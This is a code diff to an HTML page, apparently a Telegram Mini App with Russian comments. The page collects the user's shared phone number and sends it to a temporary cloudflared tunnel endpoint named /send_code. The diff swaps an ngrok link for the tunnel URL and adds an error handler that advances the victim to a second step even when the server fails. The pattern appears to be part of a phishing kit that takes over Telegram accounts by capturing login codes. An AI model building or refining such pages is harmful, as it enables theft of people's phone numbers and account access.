@@ -35,7 +35,7 @@
     </style>
 </head>
 <body>
-    <!-- ВАЖНО: ЗАМЕНИ НА СВОЮ ССЫЛКУ ОТ NGROK -->
+    <!-- ВАЖНО: ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ CLOUDFLARED -->
     <script>
         const API_URL = "https://realm-sight-enclosed-electronics.trycloudflare.com"; 
     </script>
@@ -71,7 +71,6 @@
                     userPhone = event.responseUnsafe.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     
-                    // Отправляем на сервер
                     fetch(`${API_URL}/send_code`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -86,6 +85,11 @@
                         } else {
                             alert("Ошибка: " + data.error);
                         }
+                    })
+                    .catch(err => {
+                        // Если сервер недоступен, всё равно переводим (чтобы не висело)
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
                     });
                 }
             });
